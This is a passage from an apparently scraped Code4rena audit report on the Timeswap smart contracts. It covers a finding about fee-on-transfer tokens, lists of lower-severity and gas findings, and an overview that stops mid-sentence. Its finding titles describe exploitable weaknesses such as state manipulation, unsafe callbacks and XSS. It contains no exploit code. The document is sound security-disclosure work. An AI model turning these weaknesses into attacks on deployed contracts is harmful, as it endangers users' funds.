0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The function used to trigger the callback function and verify the received value: <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L50\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L50</a></p>\n<p>Convenience contract’s callback function uses the amount specified in <code>collateralIn</code> in the transfer function: <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L535\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L535</a></p>\n<p>If the token collects fees, the value the Pair contract receives will be less than <code>collateralIn</code>. The following require statement will fail: <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L52\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L52</a></p>\n<p>The same thing applies to all the other callback functions in the library.</p>\n<p>This issue doesn’t impact the Pair contract itself. Because of the safety checks for each callback, the contract always receives the amount it expects or the transaction is reverted. Meaning, the user has to adapt and cover the fees themselves. The convenience contract doesn’t do that and thus always fails.</p>\n<p>The only issue would be outgoing transfers. For example, if a borrower pays back their debt, the pair contract receives the correct amount. But, the borrower will receive less collateral because of the fees. Since there’s no such check in those cases:\n<a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/93\">Mathepreneur (Timeswap) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Hi what projects out there are using this fee mechanism in their transfer function? And what do you think is the mitigation for this? </p>\n<p>Almost all tokens don’t have this fee implementation. If someone wants to utilize this, they can create their own convenience contract to interact with Timeswap V1 Core</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/93#issuecomment-1021384932\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Would be worth documenting the behavior for fee on transfer tokens and also expected behavior for rebasing tokens as well.</p>\n</blockquote>\n<h1 id=\"low-risk-findings-16\" style=\"position:relative;\"><a href=\"#low-risk-findings-16\" aria-label=\"low risk findings 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Findings (16)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/108\">[L-01] Incorrect Q in comment</a> <em>Submitted by sirhashalot</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/119\">[L-02] frontrun Temporary Dos attack</a> <em>Submitted by certora</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/137\">[L-03] Missing input validation on array lengths (PayMath.sol)</a> <em>Submitted by ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/145\">[L-04] no contract check in function createPair </a> <em>Submitted by Tomio</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/176\">[L-05] <code>SquareRoot#sqrtUp()</code> Wrong implementation</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/24\">[L-06] Named return issue</a> <em>Submitted by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/34\">[L-07] Core configuration variables aren’t checked for operational mistakes on construction</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/35\">[L-08] dangerous receive function</a> <em>Submitted by danb, also found by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/45\">[L-09] No check that _factory and _weth are different addresses in constructor </a> <em>Submitted by jayjonah8</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/56\">[L-10] Mint library uses wrong error code for max collateral check</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/69\">[L-11] Wrong Safe implementation</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/83\">[L-12] <code>pendingOwner</code> should be reset to <code>address(0)</code> after <code>acceptOwner()</code> is successfully called</a> <em>Submitted by Dravee, also found by cmichel, jah, p4st13r4, and pmerkleplant</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/88\">[L-13] TimeswapConvenience params structure components are not validated before usage</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/94\">[L-14] TimeswapPair’s burn miss current pool liquidity check</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/96\">[L-15] Borrowing of the whole asset supply can yield a low-level division revert</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/97\">[L-16] TimeswapPair.pay doesn’t check for non-existent debt owner</a> <em>Submitted by hyh</em></li>\n</ul>\n<h1 id=\"non-critical-findings-11\" style=\"position:relative;\"><a href=\"#non-critical-findings-11\" aria-label=\"non critical findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Findings (11)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/10\">[N-01] missing check  in constructor </a> <em>Submitted by jah</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/129\">[N-02] messing with the dues ids for victim user </a> <em>Submitted by certora</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/132\">[N-03] Outdated OpenZeppelin dependency</a> <em>Submitted by sirhashalot</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/135\">[N-04] Typos</a> <em>Submitted by ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/138\">[N-05] Open TODOs</a> <em>Submitted by ye0lde, also found by cccz</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/39\">[N-06] Liquidity constructor doesn’t check that addresses are unique </a> <em>Submitted by jayjonah8</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/168\">[N-07] Race condition on ERC20 approval</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/23\">[N-08] Not verified function inputs of public / external functions</a> <em>Submitted by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/33\">[N-09] Improper Upper Bound Definition on the Fee</a> <em>Submitted by defsec, also found by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/42\">[N-10] Insurance.sol constructor doesn’t check if addresses passed are unique </a> <em>Submitted by jayjonah8</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/98\">[N-11] WETH9 example uses payable.transfer</a> <em>Submitted by hyh</em></li>\n</ul>\n<h1 id=\"gas-optimizations-43\" style=\"position:relative;\"><a href=\"#gas-optimizations-43\" aria-label=\"gas optimizations 43 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations (43)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/102\">[G-01] Less than 256 uints are not gas efficient</a> <em>Submitted by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/104\">[G-02] Constructor Does Not Check for Zero Addresses for _factory and _weth</a> <em>Submitted by Meta0xNull, also found by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/106\">[G-03] Caching pair in timeswapPayCallback can save gas</a> <em>Submitted by p4st13r4</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/107\">[G-04] Caching weth in timeswapMintCallback can save gas</a> <em>Submitted by p4st13r4</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/109\">[G-05] Remove salt from createPair()</a> <em>Submitted by sirhashalot</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/11\">[G-06] SafeTransfer library called from pay() function is not needed </a> <em>Submitted by jayjonah8</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/126\">[G-07] calculate a condition before the loop instead of calculating it in every iteration</a> <em>Submitted by OriDabush</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/130\">[G-08] Gas: Break out of loop to save gas</a> <em>Submitted by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/136\">[G-09] Use assignment not += in function mint (TimeswapPair.sol)</a> <em>Submitted by ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/141\">[G-10] using storage instead of memory to declare struct variable inside the function</a> <em>Submitted by rfa</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/142\">[G-11] Gas Optimization: Cache result of <code>BlockNumber.get()</code></a> <em>Submitted by gzeon, also found by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/144\">[G-12] can reduce gas in function createPair by replacing interface with address</a> <em>Submitted by Tomio</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/151\">[G-13] Cache array length in for loops can save gas</a> <em>Submitted by WatchPug, also found by 0x0x0x, defsec, Dravee, PPrieditis, and robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/153\">[G-14] Avoid unnecessary storage read can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/154\">[G-15] <code>TimeswapPair.sol#mint()</code> Implementation can be simpler and save some gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/155\">[G-16] <code>TimeswapPair.sol#mint()</code> Avoiding unnecessary code execution using checks can save gas</a> <em>Submitted by WatchPug, also found by csanuragjain, Dravee, gzeon, and PPrieditis</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/156\">[G-17] Adding unchecked directive can save gas</a> <em>Submitted by WatchPug, also found by Dravee, and ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/157\">[G-18] <code>NFTTokenURIScaffold.sol#_isLtoStringTrimmedeapYear()</code> Check of <code>flag == 0</code> can be done earlier</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/159\">[G-19] Unused imports</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/16\">[G-20] Public functions to external</a> <em>Submitted by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/161\">[G-21] Remove unnecessary variables can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/163\">[G-22] Inline unnecessary internal function can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/170\">[G-23] Unnecessary checked arithmetic in for loops</a> <em>Submitted by WatchPug, also found by 0x1f8b, defsec, Dravee, OriDabush, and robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/171\">[G-24] Use short reason strings can save gas</a> <em>Submitted by WatchPug, also found by defsec</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/172\">[G-25] For uint <code>> 0</code> can be replaced with <code>!= 0</code> for gas optimization</a> <em>Submitted by 0x0x0x, also found by defsec, Dravee, fatima</em>naz, Jujic, OriDabush, rfa, WatchPug, and ye0lde_</li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/173\">[G-26] <code>SafeCast.sol#toUint128()</code> Validation of input value can be done earlier to save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/174\">[G-27] Simplify <code>SquareRoot#sqrt()</code> can save gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/177\">[G-28] <code>10 ** 9</code> can be changed to <code>1e9</code> and save some gas</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/183\">[G-29] Adding Unchecked Directive will Save Gas for BurnMath.sol#getAsset and BurnMath.sol#getCollateral functions</a> <em>Submitted by Rhynorater, also found by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/32\">[G-30] Use <code>calldata</code> instead of <code>memory</code> for function parameters</a> <em>Submitted by defsec, also found by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/36\">[G-31] gas</a> <em>Submitted by danb</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/37\">[G-32] waste of gas</a> <em>Submitted by danb</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/49\">[G-33] A more efficient for loop index proceeding</a> <em>Submitted by Jujic</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/51\">[G-34] Gas saving</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/61\">[G-35] Use Custom Errors instead of Revert Strings to save Gas</a> <em>Submitted by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/62\">[G-36] “constants” expressions are expressions, not constants. Use “immutable” instead.</a> <em>Submitted by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/80\">[G-37] Gas optimization: Placement of require statements in <code>TimeswapPair:pay()</code></a> <em>Submitted by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/81\">[G-38] Unused Named Returns</a> <em>Submitted by Dravee</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/87\">[G-39] TimeswapPair.sol modifier lock: Switching between 1, 2 instead of 0, 1 is more gas efficient</a> <em>Submitted by bitbopper, also found by rfa and WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/89\">[G-40] more efficient gas usage by removing &#x26;&#x26; operator</a> <em>Submitted by rfa</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/95\">[G-41] WithdrawMath.getCollateral reads storage repetitively for the same state variables that don’t change</a> <em>Submitted by hyh</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/124\">[G-42] subtract values in the if statement to avoid a useless operation</a> <em>Submitted by OriDabush, also found by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/120\">[G-43] Gas: No need to initialize variables with default values</a> <em>Submitted by Dravee</em></li>\n</ul>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-7\">High Risk Findings (7)</a></p>\n<ul>\n<li><a href=\"#h-01-timeswappairsolborrow-improper-implementation-allows-attacker-to-increase-poolstatez-to-a-large-value\">[H-01] <code>TimeswapPair.sol#borrow()</code> Improper implementation allows attacker to increase <code>pool.state.z</code> to a large value</a></li>\n<li><a href=\"#h-02-timeswapconveniencesolborrowgivendebt-attacker-can-increase-statey-to-an-extremely-large-value-with-a-dust-amount-of-assetout\">[H-02] <code>TimeswapConvenience.sol#borrowGivenDebt()</code> Attacker can increase <code>state.y</code> to an extremely large value with a dust amount of <code>assetOut</code></a></li>\n<li><a href=\"#h-03-manipulation-of-the-y-state-results-in-interest-rate-manipulation\">[H-03] Manipulation of the Y State Results in Interest Rate Manipulation</a></li>\n<li><a href=\"#h-04-important-state-updates-are-made-after-the-callback-in-the-mint-function-\">[H-04] Important state updates are made after the callback in the mint() function </a></li>\n<li><a href=\"#h-05-in-the-lend-function-state-updates-are-made-after-the-callback-\">[H-05] In the lend() function state updates are made after the callback </a></li>\n<li><a href=\"#h-06-borrow-function-has-state-updates-after-a-callback-to-msgsender-\">[H-06] borrow() function has state updates after a callback to msg.sender </a></li>\n<li><a href=\"#h-07-pay-function-has-callback-to-msgsender-before-important-state-updates-\">[H-07] pay() function has callback to msg.sender before important state updates </a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-10\">Medium Risk Findings (10)</a></p>\n<ul>\n<li><a href=\"#m-01-burn-doesnt-call-erc721-_burn\">[M-01] <code>burn()</code> doesn’t call ERC721 <code>_burn()</code></a></li>\n<li><a href=\"#m-02-safedecimals-can-revert-causing-dos\">[M-02] safeDecimals can revert causing DoS</a></li>\n<li><a href=\"#m-03-safename-can-revert-causing-dos\">[M-03] <code>safeName()</code> can revert causing DoS</a></li>\n<li><a href=\"#m-04-safesymbol-can-revert-causing-dos\">[M-04] <code>safeSymbol()</code> can revert causing DoS</a></li>\n<li><a href=\"#m-05-xss-via-svg-construction-contract\">[M-05] XSS via SVG Construction contract</a></li>\n<li><a href=\"#m-06-timeswappairsolmint-malicious-userattacker-can-mint-new-liquidity-with-an-extremely-small-amount-of-yincrease-and-malfunction-the-pair-with-the-maturity\">[M-06] <code>TimeswapPair.sol#mint()</code> Malicious user/attacker can mint new liquidity with an extremely small amount of <code>yIncrease</code> and malfunction the pair with the maturity</a></li>\n<li><a href=\"#m-07-no-reentrancy-guard-on-mint-function-that-has-a-callback-\">[M-07] no reentrancy guard on mint() function that has a callback </a></li>\n<li><a href=\"#m-08-users-might-pay-enormous-amounts-of-gas\">[M-08] users might pay enormous amounts of gas</a></li>\n<li><a href=\"#m-09-dos-pay-function\">[M-09] DOS pay function</a></li>\n<li><a href=\"#m-10-convenience-contract-fails-to-function-if-asset-or-collateral-is-an-erc20-token-with-fees\">[M-10] Convenience contract fails to function if asset or collateral is an ERC20 token with fees</a></li>\n</ul>\n</li>\n<li><a href=\"#low-risk-findings-16\">Low Risk Findings (16)</a></li>\n<li><a href=\"#non-critical-findings-11\">Non-Critical Findings (11)</a></li>\n<li><a href=\"#gas-optimizations-43\">Gas Optimizations (43)</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the code contest outlined in this document, C4 conducted an analysis of Timeswap contest smart contract system written in Solidity. The code contest took place between January 4—January 10 2022.\n\n## Wardens\n\n35 Wardens contributed reports to the Timeswap contest:\n\n1. jayjonah8\n1. WatchPug ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))\n1. [sirhashalot](https://twitter.com/SirH4shalot)\n1. hyh\n1. [danb](https://twitter.com/danbinnun)\n1. egjlmn1\n1. [Ruhum](https://twitter.com/0xruhum)\n1. 0x1f8b\n1. [Rhynorater](https://twitter.com/rhynorater)\n1. harleythedog\n1. [Dravee](https://twitter.com/DylanPokun)\n1. thank_you\n1. [Fitraldys](https://twitter.com/fitraldys)\n1. [ye0lde](https://twitter.com/_ye0lde)\n1. robee\n1. [Tomio](https://twitter.com/meidhiwirara)\n1. certora\n1. [defsec](https://twitter.com/defsec_)\n1. p4st13r4 (0xb4bb4 and [0x69e8](https://github.com/0x69e8))\n1. [rfa](https://www.instagram.com/riyan_rfa/)\n1. [OriDabush](https://twitter.com/ori_dabush)\n1. Jujic\n1. [cmichel](https://twitter.com/cmichelio)\n1. [jah](https://twitter.com/jah_s3)\n1. [pmerkleplant](https://twitter.com/merkleplant_eth)\n1. [gzeon](https://twitter.com/gzeon)\n1. [Meta0xNull](https://twitter.com/Meta0xNull)\n1. bitbopper\n1. PPrieditis\n1. 0x0x0x\n1. [csanuragjain](https://twitter.com/csanuragjain)\n1. fatima_naz\n1. cccz\n\nThis contest was judged by [0xean](https://github.com/0xean).\n\nFinal report assembled by [CloudEllie](https://twitter.com/CloudEllie1) and [itsmetechjay](https://twitter.com/itsmetechjay).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 33 unique vulnerabilities and 87 total findings. All of the issues presented here are linked back to their original finding.\n\nOf these vulnerabilities, 7 received a risk rating in the category of HIGH severity, 10 received a risk rating in the category of MEDIUM severity, and 16 received a risk rating in the category of LOW severity.\n\nC4 analysis also identified 11 non-critical recommendations and 43 gas optimizations.\n\n# Scope\n\nThe code under review can be found within the [C4 Timeswap contest repository](https://github.com/code-423n4/2022-01-timeswap), and is composed of 7 smart contracts written in the Solidity programming language and includes 1325 source lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code423n4.com).\n\n# High Risk Findings (7)\n## [[H-01] `TimeswapPair.sol#borrow()` Improper implementation allows attacker to increase `pool.state.z` to a large value](https://github.com/code-423n4/2022-01-timeswap-findings/issues/162)\n_Submitted by WatchPug_\n\nIn the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` 